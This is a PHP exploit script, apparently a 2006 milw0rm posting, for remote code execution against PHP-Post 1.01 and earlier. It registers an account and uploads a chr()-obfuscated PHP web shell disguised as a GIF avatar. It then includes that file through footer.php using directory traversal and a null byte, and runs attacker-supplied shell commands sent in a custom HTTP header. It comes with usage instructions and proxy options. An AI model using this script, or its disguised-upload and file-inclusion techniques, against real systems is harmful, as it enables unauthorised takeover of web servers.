#!/usr/bin/php -q -d short_open_tag=on
<?
print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 
PHP-Post <= 1.01 (template) Remote Code Execution Exploit
[Script name: PHP-Post v1.01.
[Script site: http://www.php-post.co.uk/st/content/download/
Find by: Kacper (a.k.a Rahim)
DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam
Contact: kacper1964@yahoo.pl
or
http://www.rahim.webd.pl/
(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon 
TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko., CrazzyIwan, Rammstein
Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios, 
mIvus, nukedclx, SkD, wacky
';

if ($argc<4) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path cmd OPTIONS
host:      target server (ip/hostname)
path:      PHP-Post path
cmd:       a shell command (ls -la)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 2.2.2.2 /PHP-Post/ ls -la -P1.1.1.1:80
php '.$argv[0].' 1.1.1.1 /  -p81
-----------------------------------------------------------------------------
');
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";

$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}


$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="userid"

hauru
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="userpassword"

devilteam
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="userpassword2"

devilteam
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="username"

hauru
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="useremail"

hauru@devilteam.pl
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="Register"

Register
-----------------------------7d6224c08dc--
';
$packet ="POST ".$p."register.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);

$hauru=
chr(0x47).chr(0x49).chr(0x46).chr(0x38).chr(0x36).chr(0x3c).
chr(0x3f).chr(0x70).chr(0x68).chr(0x70).chr(0x20).chr(0x6f).
chr(0x62).chr(0x5f).chr(0x63).chr(0x6c).chr(0x65).chr(0x61).
chr(0x6e).chr(0x28).chr(0x29).chr(0x3b).chr(0x65).chr(0x63).
chr(0x68).chr(0x6f).chr(0x22).chr(0x48).chr(0x61).chr(0x63).
chr(0x6b).chr(0x65).chr(0x72).chr(0x5f).chr(0x4b).chr(0x61).
chr(0x63).chr(0x70).chr(0x65).chr(0x72).chr(0x5f).chr(0x4d).
chr(0x61).chr(0x64).chr(0x65).chr(0x5f).chr(0x69).chr(0x6e).
chr(0x5f).chr(0x50).chr(0x6f).chr(0x6c).chr(0x61).chr(0x6e).
chr(0x64).chr(0x21).chr(0x21).chr(0x2e).chr(0x2e).chr(0x48).
chr(0x61).chr(0x75).chr(0x72).chr(0x75).chr(0x2e).chr(0x2e).
chr(0x5e).chr(0x5f).chr(0x5e).chr(0x2e).chr(0x2e).chr(0x74).
chr(0x68).chr(0x65).chr(0x2e).chr(0x2e).chr(0x62).chr(0x65).
chr(0x73).chr(0x74).chr(0x2e).chr(0x2e).chr(0x70).chr(0x6f).
chr(0x6c).chr(0x69).chr(0x73).chr(0x68).chr(0x2e).chr(0x2e).
chr(0x74).chr(0x65).chr(0x61).chr(0x6d).chr(0x2e).chr(0x2e).
chr(0x47).chr(0x72).chr(0x65).chr(0x65).chr(0x74).chr(0x7a).
chr(0x22).chr(0x3b).chr(0x69).chr(0x6e).chr(0x69).chr(0x5f).
chr(0x73).chr(0x65).chr(0x74).chr(0x28).chr(0x22).chr(0x6d).
chr(0x61).chr(0x78).chr(0x5f).chr(0x65).chr(0x78).chr(0x65).
chr(0x63).chr(0x75).chr(0x74).chr(0x69).chr(0x6f).chr(0x6e).
chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).chr(0x22).
chr(0x2c).chr(0x30).chr(0x29).chr(0x3b).chr(0x65).chr(0x63).
chr(0x68).chr(0x6f).chr(0x20).chr(0x22).chr(0x6d).chr(0x79).
chr(0x5f).chr(0x64).chr(0x65).chr(0x6c).chr(0x69).chr(0x6d).
chr(0x22).chr(0x3b).chr(0x70).chr(0x61).chr(0x73).chr(0x73).
chr(0x74).chr(0x68).chr(0x72).chr(0x75).chr(0x28).chr(0x24).
chr(0x5f).chr(0x53).chr(0x45).chr(0x52).chr(0x56).chr(0x45).
chr(0x52).chr(0x5b).chr(0x48).chr(0x54).chr(0x54).chr(0x50).
chr(0x5f).chr(0x48).chr(0x41).chr(0x55).chr(0x52).chr(0x55).
chr(0x5d).chr(0x29).chr(0x3b).chr(0x64).chr(0x69).chr(0x65).
chr(0x3b).chr(0x3f).chr(0x3e);

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="userfile"; filename="hauru.gif"
Content-Type: text/plain

'.$hauru.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="Upload new avatar"

Upload new avatar
-----------------------------7d6224c08dc--
';

$packet ="POST ".$p."avatar.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);


$packet ="GET ".$p."footer.php?template=../gfx/avatars/hauru.gif%00 HTTP/1.1\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"my_delim"))
{
$temp=explode("my_delim",$html);
die($temp[1]);
}
echo "Exploit err0r :(";
echo "Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam";
?>

# milw0rm.com [2006-10-18]
